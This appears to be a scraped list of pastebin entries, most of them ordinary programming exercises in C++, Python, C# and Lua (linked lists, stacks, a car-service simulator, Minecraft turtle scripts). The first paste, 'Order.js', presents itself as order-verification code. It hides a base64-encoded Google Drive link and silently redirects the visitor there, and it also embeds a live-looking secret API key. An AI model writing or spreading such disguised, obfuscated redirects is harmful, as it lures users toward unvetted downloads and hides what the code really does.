  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n0YBdgXK,Order.js,Epiphemeral,JavaScript,Friday 4th of April 2025 12:55:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/664/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eavFyZ7c,Untitled,Josif_tepe,C++,Friday 4th of April 2025 12:55:07 PM CDT,"#include <iostream>
using namespace std;
 
struct node {
    int info;
    node * next;
    node * prev;
};
struct igrac {
    string ime, prezime;
    int poeni;
};
 
struct DPLista {
    node * head;
    
    void init() {
        head = NULL;
    }
    
    void dodadiPrv(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
        }
    }
    
    void dodadiPosleden(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            node * tmp = head;
            while(tmp->next != NULL) {
                tmp = tmp->next;
            }
            
            tmp->next = new_node;
            new_node->prev = tmp;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                head = head->next;
                delete head->prev;
                head->prev = NULL;
            }
        }
    }
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                node * tmp = head;
                while(tmp->next != NULL) {
                    tmp = tmp->next;
                }
                tmp->prev->next = NULL;
                delete tmp;
                tmp = NULL;
            }
        }
    }
    
    void brishiLista() {
        while(head != NULL) {
            deleteEnd();
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp->info != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    void pechati() {
        node * tmp = head, * last;
        while(tmp != NULL) {
            last = tmp;
            cout << tmp->info << ""->"";
            tmp = tmp -> next;
        }
        cout << endl;
        
        while(last != NULL) {
            cout << last->info << ""<--"";
            last = last->prev;
        }
        cout << endl;
    }
};
void igra(igrac & i1, igrac & i2, DPLista & l1) {
    cout << ""Igrac1: "" << i1.ime << "" "" << i1.prezime << endl;
    node * tmp = l1.head;
    
    string direkcija;
    int cekori;
    
    while(cin >> cekori >> direkcija) {
        if(direkcija == ""l"") {
            while(tmp != NULL and cekori > 0) {
                tmp = tmp->prev;
                cekori--;
            }
            
            if(tmp == NULL) {
                cout << ""GAME OVER! "" << i1.poeni << endl;
                break;
            }
            else {
                i1.poeni += tmp->info;
            }
        }
        else {
            while(tmp != NULL and cekori > 0) {
                tmp = tmp->next;
                cekori--;
            }
            
            if(tmp == NULL) {
                cout << ""GAME OVER! "" << i1.poeni << endl;
                break;
            }
            else {
                i1.poeni += tmp->info;
            }
        }
    }
    
    cout << ""Igrac2: "" << i2.ime << "" "" << i2.prezime << endl;
    node * tmp2 = l1.head;
    while(cin >> cekori >> direkcija) {
        if(direkcija == ""l"") {
            while(tmp2 != NULL and cekori > 0) {
                tmp2 = tmp2->prev;
                cekori--;
            }
            
            if(tmp2 == NULL) {
                cout << ""GAME OVER! "" << i2.poeni << endl;
                break;
            }
            else {
                cout << tmp2->info << endl;

                i2.poeni += tmp2->info;
            }
        }
        else {
            while(tmp2 != NULL and cekori > 0) {
                tmp2 = tmp2->next;
                cekori--;
            }
            
            if(tmp2 == NULL) {
                cout << ""GAME OVER! "" << i2.poeni << endl;
                break;
            }
            else {
                cout << tmp2->info << endl;
                i2.poeni += tmp2->info;
            }
        }
    }
    
    
}

int main()
{
    DPLista l1;
    l1.init();
    igrac i1;
    igrac i2;
    i1.ime = ""Paul"";
    i1.prezime = ""Kalk"";
    i1.poeni = 0;
    i2.ime = ""Jamie"";
    i2.prezime = ""Jones"";
    i2.poeni = 0;
    l1.dodadiPrv(6);
    l1.dodadiPosleden(5);
    l1.dodadiPosleden(2);
    l1.dodadiPosleden(10);
    l1.dodadiPosleden(3);
    l1.dodadiPosleden(0);
    l1.dodadiPosleden(7);
    l1.pechati();
    
    igra(i1, i2, l1);
    
    if (i1.poeni > i2.poeni)
        cout << ""Pobednik e ""<<i1.ime<<"" ""<<i1.prezime<<"" so ""<<i1.poeni<<""poeni"";
    if (i2.poeni > i1.poeni)
        cout << ""Pobednik e ""<<i2.ime<<"" ""<<i2.prezime<<"" so ""<<i2.poeni<<""poeni"";
    if (i1.poeni == i2.poeni)
    {
        cout << ""Dvajcata igraci imaat ist broj na poeni: ""<<i1.ime<<"" ""<<i1.prezime<<"" so ""<<i1.poeni<<""poeni"";
        cout << "" i ""<<i2.ime<<"" ""<<i2.prezime<<"" so ""<<i2.poeni<<""poeni"";
    }
    l1.brishiLista();
}
"
3ebFKs9q,Untitled,Derik_hacker,Python,Friday 4th of April 2025 12:41:03 PM CDT,"from datetime import datetime


nome = input(""Inserisci il tuo nome: "") # ici input nous permet de recuperer le nom de l'utilisateur et le garder dans la variable nom
data_nascita_str = input(""Inserisci la tua data di nascita (formato: YYYY-MM-DD): "") # ici input nous permet de recuperer la date de naissance de l'utilisateur et le garder dans la variable data_nascita_str

#le code qui suit nous permet de verifier si la date de naissance est valide c'est a dire si elle est au format YYYY-MM-DD(annee-mois-jour) 
#si l'utilisateur ne respecte pas ce format, le code entre dans except et affiche un message d'erreur
#par contre si l'utilisateur respecte le format, le code entre dans try et la date de naissance est convertie en un objet datetime
try:
    
    data_nascita = datetime.strptime(data_nascita_str, ""%Y-%m-%d"")

    #datetime.strptime() est une méthode de la classe datetime qui permet de convertir une chaîne de caractères en un objet datetime c'est 
    #c'est a dire sous le format YYYY-MM-DD(annee-mois-jour)
    #la méthode strptime() prend deux arguments: la chaîne de caractères  à convertir (qui est notre variable data_nascita_str)et le format de la chaîne de caractères
except ValueError:
    # ValueError est une exception qui est levée lorsque la conversion échoue
    #cela signifie que la chaîne de caractères ne correspond pas au format spécifié (YYYY-MM-DD)
    #dans ce cas, on affiche un message d'erreur et on quitte le programme
    #exit() est une fonction qui termine le programme
    print(""Formato data non valido. Assicurati di usare YYYY-MM-DD."")
    exit()

#datetime.today() est une méthode de la classe datetime qui renvoie la date et l'heure actuelles sous forme d'objet datetime
#ici on l'utilise pour recuperer la date actuelle et la garder dans la variable oggi
oggi = datetime.today()
#ici en bas je prend l'annee actuelle - l'annee de naissance que l'utilisateur a entré 
#et je soustrait 1 si la date actuelle est prima della data di nascita
#c'est a dire si le mois et le jour de la date actuelle sont inférieurs au mois et au jour de la date de naissance
#cela nous permet de calculer l'âge de l'utilisateur
#en tenant compte de la date actuelle et de la date de naissance

#en quelque sorte je calcule si mon anniversaire est déjà passé ou pas 
#si mon anniversaire est déjà passé, je garde l'age tel quel
#si mon anniversaire n'est pas encore passé, je soustrait 1 à l'age
#et la partie ((oggi.month, oggi.day) < (data_nascita.month, data_nascita.day)) renvoie True vaut 1 ou  False vaut 0
#ce qui nous donne un age correct

eta = oggi.year - data_nascita.year - ((oggi.month, oggi.day) < (data_nascita.month, data_nascita.day))

#ici je verifie si l'age est supérieur ou égal à 18 ans
#si c'est le cas, je dis que l'utilisateur est majeur j'entre dans la première partie de l'instruction if
#sinon je dis que l'utilisateur est mineur j'entre dans le else
if eta >= 18:
    print(f""Ciao {nome}, hai {eta} anni. Sei maggiorenne!"")
else:
    print(f""Ciao {nome}, hai {eta} anni. Sei minorenne!"")
"
vJJBZ1Zw,Console,spah,GetText,Friday 4th of April 2025 12:40:35 PM CDT,"@echo off
exit"
guzN08f6,asd,temposabel,Lua,Friday 4th of April 2025 12:30:32 PM CDT,"DIRECTIONS = {""north"", ""east"", ""south"", ""west""}
NORTH, EAST, SOUTH, WEST, UP, DOWN = 1, 2, 3, 4, 5, 6
DELTA = {vector.new(0, 0, -1), vector.new(1, 0, 0), vector.new(0, 0, 1), vector.new(-1, 0, 0), vector.new(0, 1, 0), vector.new(0, -1, 0)}

BLOCKS_TO_MINE = {
  ""minecraft:diamond_ore"": true,
}

local start_pos = vector.new()  -- FILL IN BEFORE START
local current_direction = NORTH -- FILL IN BEFORE START
local current_pos = start_pos





function info()
  print(""-------------------------"")
  print(""XYZ:"", current_pos.x, ""/"", current_pos.y, ""/"", current_pos.z)
  print(""Facing: ""..DIRECTIONS[current_direction])
  print(""Fuel Level: ""..turtle.getFuelLevel())
  print(""-------------------------"")
end

function calculate_rotation(dir, amount)
  local d = dir - 1
  d = (d + amount) % 4
  return d + 1
end

function rotate_right(amount)
  local amount = amount or 1
  
  for i=1, amount do
    turtle.turnRight()
  end

  current_direction = calculate_rotation(current_direction, amount)
end

function rotate_left(amount)
  local amount = amount or 1

  for i=1, amount do
    turtle.turnLeft()
  end
  
  current_direction = calculate_rotation(current_direction, -amount)
end

function face(direction)
  if current_direction == direction then
    return
  elseif calculate_rotation(current_direction, 1) == direction then
    rotate_right()
  elseif calculate_rotation(current_direction, -1) == direction then
    rotate_left()
  else
    rotate_right(2)
  end
end

function move_forward(amount, dig)
  local amount = amount or 1
  local dig = dig or false
  
  for i=1, amount do
    while turtle.detect() do
      if dig then
        turtle.dig()
      else
        print(""Stepbro I'm Stuck! (in front)"")
      end
    end

    turtle.forward()
    current_pos = current_pos + DELTA[current_direction]
    info()
  end
end

function move_backward(amount, dig)
  rotate_right(2)
  move_forward(amount, dig)
  rotate_left(2)
end

function move_right(amount, dig)
  rotate_right()
  move_forward(amount, dig)
  rotate_left()
end

function move_left(amount, dig)
  rotate_left()
  move_forward(amount, dig)
  rotate_right()
end

function move_up(amount, dig)
  local amount = amount or 1
  local dig = dig or false

  for i=1, amount do
    while turtle.detectUp() do
      if dig then
        turtle.digUp()
      else
        print(""Stepbro I'm Stuck! (above)"")
      end
    end

    turtle.up()
    current_pos = current_pos + DELTA[UP]
    info()
  end
end

function move_down(amount, dig)
  local amount = amount or 1
  local dig = dig or 1

  for i=1, amount do
    while turtle.detectDown() do
      if dig then
        turtle.digDown()
      else
        print(""Stepbro I'm Stuck! (below)"")
      end
    end

    turtle.down()
    current_pos = current_pos + DELTA[DOWN]
    info()
  end
end

function go_down_to(level)
  for i=0,level do
    turtle.digDown()
    turtle.down()
  end
end

function manhattan_distance(pos1, pos2)
  return math.abs(pos1.x - pos2.x) + math.abs(pos1.y - pos2.y) + math.abs(pos1.z - pos2.z)
end

function get_available_fuel()
  local available_fuel = turtle.getFuelLevel()

  for i=1, 16 do
    local item = turtle.getItemDetail(i)

    if item and item.name == ""minecraft:coal"" then
      available_fuel = available_fuel + item.count * 80
    end
  end
  
  return available_fuel
end

function has_ore_in_vicinity()
  blocks = {}
  
  table.insert(blocks,turtle.inspectDown()[2].name)
  table.insert(blocks,turtle.inspectUp()[2].name)

  table.insert(blocks,turtle.inspect()[2].name)
  turtle.turnLeft()
  table.insert(blocks,turtle.inspect()[2].name)
  turtle.turnRight(2)
  table.insert(blocks,turtle.inspect()[2].name)
  turtle.turnLeft()

  for _, block in ipairs(blocks) do
    if BLOCKS_TO_MINE[block] ~= nil do
      return true
    end
  end
  
  return false
end

function mine_vein(depth, visited)
  local visited = visited or {}
  if depth == 0 then return end

  local local_start_dir = current_direction

  -- Forward/Backward/Left/Right
  for i=0, 3 do
    local new_dir = calculate_rotation(local_start_dir, i)
    local block = (current_pos + DELTA[new_dir]):tostring()

    if visited[block] == nil then
      visited[block] = true

      face(new_dir)

      local not_air, block_data = table.unpack(turtle.inspect())
      if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
        move_forward(1, true)
        mine_vein(depth - 1, visited)
        face(calculate_rotation(new_dir, 2))
        move_forward(1, true)
      end
    end
  end

  -- Up/Down
  local block = (current_pos + DELTA[UP]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = table.unpack(turtle.inspectUp())
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_up(1, true)
      mine_vein(depth - 1, visited)
      move_down(1, true)
    end
  end

  local block = (current_pos + DELTA[DOWN]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = table.unpack(turtle.inspectDown())
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_down(1, true)
      mine_vein(depth - 1, visited)
      move_up(1, true)
    end
  end
end

"
a5ED8VTg,Untitled,Josif_tepe,C++,Friday 4th of April 2025 12:28:02 PM CDT,"#include <iostream>
using namespace std;
const int maxn = 1000;
 
struct stackk {
    int niza[maxn];
    int idx;
    
    void init() {
        idx = -1;
    }
    
    void push(int x) {
        if(idx + 1 >= maxn) {
            cout << ""NEMA DOVOLNO KAPACITET"" << endl;
            return;
        }
        idx++;
        niza[idx] = x;
    }
    
    int pop() {
        if(idx == -1) {
            cout << ""NEMA NITU EDEN ELEMENT VO STEKOT"" << endl;
            return -1;
        }
        int result = niza[idx];
        idx--;
        return result;
    }
    
    int top() {
        if(idx == -1) {
            cout << ""NEMA NITU EDEN ELEMENT VO STEKOT"" << endl;
            return -1;
        }
        return niza[idx];
    }
    
    int size() {
        return idx + 1;
    }
    
    int isEmpty() {
        if(idx == -1) {
            return 1;
        }
        else {
            return 0;
        }
    }
};

void promeni(stackk & m1) {
    stackk m2;
    m2.init();
    
    while(m1.isEmpty() == false) {
        m2.push(m1.pop());
    }
    
    stackk nad;
    nad.init();
    
    while(m2.isEmpty() == false) {
        int c = m2.pop();
        
        if(nad.isEmpty() == false) {
            if(c % nad.top() == 0) {
                m1.push(c / nad.top());
            }
        }
        nad.push(c);
        
        if(m2.isEmpty() == false) {
            if(c % m2.top() == 0) {
                m1.push(c / m2.top());
            }
        }
    }
}
int main() {
    stackk m1;

    m1.init();

    m1.push(2);
    m1.push(10);
    m1.push(5);
    m1.push(2);
    m1.push(1);

    promeni(m1);

    while (!m1.isEmpty()) {
        cout << m1.pop() << endl;
    }

    return 0;
}
"
5798yyWL,#50,vovanhik_24,C#,Friday 4th of April 2025 12:19:28 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace CarService
{
    public class Program
    {
        static void Main(string[] args)
        {
            AutoService service = new AutoService();
            service.Run();
        }
    }

    public class Detail
    {
        public Detail(string name, decimal price, bool isBroken)
        {
            Name = name;
            Price = price;
            IsBroken = isBroken;
        }

        public string Name { get; private set; }
        public decimal Price { get; private set; }
        public bool IsBroken { get; private set; }
    }

    public class DetailStorage
    {
        public DetailStorage(Detail detail, int amount = 1)
        {
            Detail = detail;
            Amount = amount;
        }

        public Detail Detail { get; private set; }
        public int Amount { get; private set; }

        public int SetAmount(int amount)
        {
            return Amount += amount;
        }
    }

    public class AutoServiceStorage
    {
        private readonly List<DetailStorage> _partsInStock;

        public AutoServiceStorage()
        {
            _partsInStock = new List<DetailStorage>
            {
                new DetailStorage(new Detail(""Двигатель"", 5000, false), UserUtils.GenerateRandom(10)),
                new DetailStorage(new Detail(""Тормоза"", 1200, false), UserUtils.GenerateRandom(10)),
                new DetailStorage(new Detail(""Фара"", 800, false), UserUtils.GenerateRandom(10)),
                new DetailStorage(new Detail(""Аккумулятор"", 2500, false), UserUtils.GenerateRandom(10))
            };
        }

        public bool PartsInStock(string partName)
        {
            DetailStorage StorageItem = _partsInStock.FirstOrDefault(i => i.Detail.Name == partName);

            if (StorageItem == null || StorageItem.Amount <= 0)
            {
                Console.WriteLine($""Нет нужной детали: {partName}"");
                return false;
            }

            return true;
        }

        public bool DecreasePartAmount(string partName)
        {
            DetailStorage StorageItem = _partsInStock.FirstOrDefault(i => i.Detail.Name == partName);

            if (StorageItem != null && StorageItem.Amount > 0)
            {
                StorageItem.SetAmount(-1);
                return true;
            }

            return false;
        }

        public List<DetailStorage> GetAllParts()
        {
            return _partsInStock;
        }
    }

    public class Car
    {
        public Car(string model, List<Detail> detail)
        {
            Model = model;
            Detail = detail;
            IsRepairStarted = false;
        }

        public string Model { get; private set; }
        public List<Detail> Detail { get; private set; }
        public bool IsRepairStarted { get; private set; }

        public List<Detail> GetBrokenParts()
        {
            return Detail.Where(i => i.IsBroken).ToList();
        }

        public bool IsFullyRepaired()
        {
            return !Detail.Any(i => i.IsBroken);
        }

        public void StartRepair()
        {
            IsRepairStarted = true;
        }

        public bool ReplacePart(Detail newPart)
        {
            Detail brokenPart = Detail.FirstOrDefault(i => i.Name == newPart.Name);

            if (brokenPart != null)
            {
                Detail.Remove(brokenPart);
                Detail.Add(newPart);

                return true;
            }

            return false;
        }
    }

    public class CarCreator
    {
        private readonly List<Car> _cars;

        public CarCreator()
        {
            _cars = new List<Car>
            {
                new Car(""Toyota"", new List<Detail>
                {
                    new Detail(""Двигатель"", 500m, true),
                    new Detail(""Фара"", 100m, true),
                    new Detail(""Тормоза"", 150m, false)
                }),
                new Car(""Honda"", new List<Detail>
                {
                    new Detail(""Аккумулятор"", 500m, true),
                    new Detail(""Двигатель"", 100m, false)
                })
            };
        }

        public List<Car> GetCars()
        {
            return _cars;
        }
    }

    public class AutoService
    {
        private const decimal RepairFEE = 1000;
        private const decimal CancelBeforeRepairFee = 2000;
        private const decimal CancelDuringRepairFeePerPart = 600;

        private readonly CarCreator _carCreator;
        private readonly Queue<Car> _cars;
        private readonly AutoServiceStorage _storage;
        private decimal _balance;

        public AutoService()
        {
            _cars = new Queue<Car>();
            _carCreator = new CarCreator();
            _storage = new AutoServiceStorage();
            _balance = UserUtils.GenerateRandom(10000);

            AddCarsToQueue();
        }

        public void Run()
        {
            const string CommandToRepair = ""1"";
            const string CommandToCancelRepair = ""2"";
            const string CommandToExit = ""3"";

            bool isWorking = true;

            while (isWorking && _cars.Count > 0 && _balance > 0)
            {
                Console.Clear();
                ShowServiceStatus();

                Car currentCar = _cars.Peek();

                Console.WriteLine($""\nТекущая машина: {currentCar.Model}"");
                ShowBrokenParts(currentCar);

                Console.WriteLine(""\nВыберите действие:"");
                Console.WriteLine(""1 - Отремонтировать деталь"");
                Console.WriteLine(""2 - Отказаться от ремонта"");
                Console.WriteLine(""3 - Выйти"");

                Console.Write(""Введите номер команды: "");
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandToRepair:
                        Console.Write(""Введите название детали для ремонта: "");
                        string partName = Console.ReadLine();

                        RepairPart(currentCar, partName);
                        Pause();
                        break;

                    case CommandToCancelRepair:
                        CancelRepair(currentCar);
                        Pause();
                        break;

                    case CommandToExit:
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод"");
                        Pause();
                        break;
                }
            }

            Console.WriteLine(""\nРабота сервиса завершена."");
            Console.WriteLine($""Итоговый баланс: {_balance}"");
        }

        private void Pause()
        {
            Console.WriteLine(""\nНажмите любую клавишу для продолжения..."");
            Console.ReadKey();
        }

        private void AddCarsToQueue()
        {
            List<Car> cars = _carCreator.GetCars();

            foreach (Car car in cars)
            {
                _cars.Enqueue(car);
                Console.WriteLine($""Машина {car.Model} добавлена в очередь"");
            }
        }

        private void ShowBrokenParts(Car car)
        {
            List<Detail> brokenParts = car.GetBrokenParts();
            Console.WriteLine($""Сломанные детали в {car.Model}:"");

            foreach (Detail part in brokenParts)
            {
                Console.WriteLine($""- {part.Name} (Цена: {part.Price})"");
            }

            if (brokenParts.Count == 0)
            {
                Console.WriteLine(""Все детали исправны."");
            }
        }

        private void CancelRepair(Car car)
        {
            decimal penalty;

            if (car.IsRepairStarted == false)
            {
                penalty = CancelBeforeRepairFee;
                Console.WriteLine($""В ремонте было отказано. Штраф за отказ от услуг: {penalty}"");
            }
            else
            {
                int brokenPartsCount = car.GetBrokenParts().Count;
                penalty = brokenPartsCount * CancelDuringRepairFeePerPart;

                Console.WriteLine($""Отказ от ремонта во время работы. Штраф: {penalty} ({brokenPartsCount} сломанных деталей)"");
            }

            _balance -= penalty;
            RemoveCarQueue(car);
        }

        private bool RepairPart(Car car, string partName)
        {
            car.StartRepair();

            List<Detail> brokenParts = car.GetBrokenParts();
            Detail partToRepair = brokenParts.FirstOrDefault(i => i.Name.Equals(partName, StringComparison.OrdinalIgnoreCase));

            if (partToRepair == null)
            {
                Console.WriteLine($""Деталь {partName} не сломана или не существует"");
                return false;
            }

            if (!_storage.PartsInStock(partName))
            {
                Console.WriteLine($""Нет нужной детали на складе: {partName}"");
                return false;
            }

            Detail newPart = new Detail(partName, partToRepair.Price, false);

            if (car.ReplacePart(newPart))
            {
                _storage.DecreasePartAmount(partName);

                _balance += partToRepair.Price + RepairFEE;
                Console.WriteLine($""Деталь {partName} заменена. Прибыль: {partToRepair.Price + RepairFEE}"");

                if (car.IsFullyRepaired())
                {
                    RemoveCarQueue(car);
                    Console.WriteLine($""Машина {car.Model} полностью отремонтирована и удалена из очереди"");
                }

                return true;
            }

            return false;
        }

        private void ShowServiceStatus()
        {
            Console.WriteLine($""\nТекущий баланс: {_balance}"");

            Console.WriteLine(""\nМашины в очереди:"");
            if (_cars.Count == 0)
            {
                Console.WriteLine(""Очередь пуста."");
            }
            else
            {
                foreach (Car car in _cars)
                {
                    Console.WriteLine($""- {car.Model} (Сломанных деталей: {car.GetBrokenParts().Count})"");
                }
            }

            Console.WriteLine(""\nДетали на складе:"");
            foreach (DetailStorage part in _storage.GetAllParts())
            {
                Console.WriteLine($""- {part.Detail.Name}: {part.Amount} шт. (Цена: {part.Detail.Price})"");
            }
        }

        private void RemoveCarQueue(Car car)
        {
            Queue<Car> newQueue = new Queue<Car>(_cars.Where(i => i != car));
            _cars.Clear();

            foreach (Car i in newQueue)
            {
                _cars.Enqueue(i);
            }
        }
    }

    class UserUtils
    {
        private static Random s_random = new Random();

        public static int GenerateRandom(int maxValue)
        {
            return s_random.Next(0, maxValue + 1);
        }

        public static int GenerateRandom(int minValue, int maxValue)
        {
            return s_random.Next(minValue, maxValue + 1);
        }

        public static int BaseRandomGenerator(int maxValue)
        {
            return s_random.Next(0, maxValue);
        }

        public static int BaseRandomGenerator(int minValue, int maxValue)
        {
            return s_random.Next(minValue, maxValue);
        }
    }
}"
crexyivH,Basic multithreading c++,Oppenheimer,C++,Friday 4th of April 2025 12:19:17 PM CDT,"#include<iostream>
#include<thread>
#include<ctime>
#include<mutex>
#include<bits/stdc++.h>

// 
//https://www.youtube.com/watch?v=13dFggo4t_I&list=PL5jc9xFGsL8E12so1wlMS0r0hTQoJL74M&index=6
// 

using namespace std;

mutex carMutex;
mutex mux;

void function1(char symbol){
    carMutex.lock();

    

    for(int i=0;i<200;i++){
        cout << symbol;
    }

    carMutex.unlock();
}

void function2(){

    unique_lock<mutex> carLock(carMutex);
    
    carLock.try_lock();

    carLock.try_lock_for(500ns);


    for(int i=0;i<200;i++){
        cout << ""- "";
    }
    this_thread::sleep_for(2000ms);

    this_thread::get_id();


    carLock.unlock();
}

void func3(){

    // automatically unlocks when variable goes out of scope
    lock_guard<mutex> guardLock(mux);

    cout << ""Hello"" <<endl;

}

int main(){

    time_t currentTime = time(nullptr);
    cout << currentTime << endl;

    thread worker1(function1, ')');

    thread worker2(function2);

    if(worker1.joinable()){
        worker1.join(); 
    }

    // shifting ownership of thread
    thread t3 = move(worker1);

    worker2.detach();

    // returns no of cores in system, optimal -> no of threads = no of cores
    hardware_concurrency();


    return 0;

}


"
FQrkcH20,modem testing receiver,Incomprehensible,Lua,Friday 4th of April 2025 12:18:56 PM CDT,"local monitor = peripheral.find(""monitor"")
local modem = peripheral.find(""modem"", rednet.open) -- doing it like this finds all modem peripherals and then opens rednet on them
local tPos
--- MAIN
monitor.clear()
monitor.setCursorPos(1,1)
monitor.setTextScale(0.5)
monitor.write(""Hello, ID: "" .. os.computerID()) --the id of the computer

function vec3ToString(vec3)
	local str = (""(x:"" .. math.floor(vec3.x+0.5) .. "", y:"" .. math.floor(vec3.y+0.5) .. "", z:"" .. math.floor(vec3.z+0.5) .. "")"")
	return str
end

function receivePosMessage()
	local id, message = rednet.receive(nil,0.5)
	if (message == nil) then return end
	monitor.clear()
	monitor.setCursorPos(1,1)
	monitor.write(""Message from ID: "" .. id .. "" = "" .. vec3ToString(message))
	tPos = message

end

function update()
	receivePosMessage()
end

while true do
	sleep(0.5)
	update()
end"
JPc9Y4n1,Twitch_chat_pickle,ZeProf2ModsYTB,Lua,Friday 4th of April 2025 12:15:46 PM CDT,"CHATROOM = ""picklelizcious""
SUBSONLY = false
CLEAR_MESSAGES = true

local expect = require ""cc.expect""
local expect, field = expect.expect, expect.field

local type, getmetatable, setmetatable, colours, str_write, tostring = type, getmetatable, setmetatable, colours, write, tostring
local debug_info = type(debug) == ""table"" and type(debug.getinfo) == ""function"" and debug.getinfo
local debug_local = type(debug) == ""table"" and type(debug.getlocal) == ""function"" and debug.getlocal

--- @{table.insert} alternative, but with the length stored inline.
local function append(out, value)
    local n = out.n + 1
    out[n], out.n = value, n
end

--- A document containing formatted text, with multiple possible layouts.
--
-- Documents effectively represent a sequence of strings in alternative layouts,
-- which we will try to print in the most compact form necessary.
--
-- @type Doc
local Doc = { }

--- An empty document.
local empty = setmetatable({ tag = ""nil"" }, Doc)

--- A document with a single space in it.
local space = setmetatable({ tag = ""text"", text = "" "" }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{empty}.
local line = setmetatable({ tag = ""line"", flat = empty }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{space}.
local space_line = setmetatable({ tag = ""line"", flat = space }, Doc)

local text_cache = { [""""] = empty, ["" ""] = space, [""\n""] = space_line }

local function mk_text(text, colour)
    return text_cache[text] or setmetatable({ tag = ""text"", text = text, colour = colour }, Doc)
end

--- Create a new document from a string.
--
-- If your string contains multiple lines, @{group} will flatten the string
-- into a single line, with spaces between each line.
--
-- @tparam      string text   The string to construct a new document with.
-- @tparam[opt] number colour The colour this text should be printed with. If not given, we default to the current
-- colour.
-- @treturn Doc The document with the provided text.
-- @usage Write some blue text.
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.text(""Hello!"", colours.blue))
local function text(text, colour)
    expect(1, text, ""string"")
    expect(2, colour, ""number"", ""nil"")

    local cached = text_cache[text]
    if cached then return cached end

    local new_line = text:find(""\n"", 1)
    if not new_line then return mk_text(text, colour) end

    -- Split the string by ""\n"". With a micro-optimisation to skip empty strings.
    local doc = setmetatable({ tag = ""concat"", n = 0 }, Doc)
    if new_line ~= 1 then append(doc, mk_text(text:sub(1, new_line - 1), colour)) end

    new_line = new_line + 1
    while true do
        local next_line = text:find(""\n"", new_line)
        append(doc, space_line)
        if not next_line then
            if new_line <= #text then append(doc, mk_text(text:sub(new_line), colour)) end
            return doc
        else
            if new_line <= next_line - 1 then
                append(doc, mk_text(text:sub(new_line, next_line - 1), colour))
            end
            new_line = next_line + 1
        end
    end
end

--- Concatenate several documents together. This behaves very similar to string concatenation.
--
-- @tparam Doc|string ... The documents to concatenate.
-- @treturn Doc The concatenated documents.
-- @usage
--     local pretty = require ""cc.pretty""
--     local doc1, doc2 = pretty.text(""doc1""), pretty.text(""doc2"")
--     print(pretty.concat(doc1, "" - "", doc2))
--     print(doc1 .. "" - "" .. doc2) -- Also supports ..
local function concat(...)
    local args = table.pack(...)
    for i = 1, args.n do
        if type(args[i]) == ""string"" then args[i] = text(args[i]) end
        if getmetatable(args[i]) ~= Doc then expect(i, args[i], ""document"") end
    end

    if args.n == 0 then return empty end
    if args.n == 1 then return args[1] end

    args.tag = ""concat""
    return setmetatable(args, Doc)
end

Doc.__concat = concat --- @local

--- Indent later lines of the given document with the given number of spaces.
--
-- For instance, nesting the document
-- ```txt
-- foo
-- bar
-- ```
-- by two spaces will produce
-- ```txt
-- foo
--   bar
-- ```
--
-- @tparam number depth The number of spaces with which the document should be indented.
-- @tparam Doc    doc   The document to indent.
-- @treturn Doc The nested document.
-- @usage
--     local pretty = require ""cc.pretty""
--     print(pretty.nest(2, pretty.text(""foo\nbar"")))
local function nest(depth, doc)
    expect(1, depth, ""number"")
    if getmetatable(doc) ~= Doc then expect(2, doc, ""document"") end
    if depth <= 0 then error(""depth must be a positive number"", 2) end

    return setmetatable({ tag = ""nest"", depth = depth, doc }, Doc)
end

local function flatten(doc)
    if doc.flat then return doc.flat end

    local kind = doc.tag
    if kind == ""nil"" or kind == ""text"" then
        return doc
    elseif kind == ""concat"" then
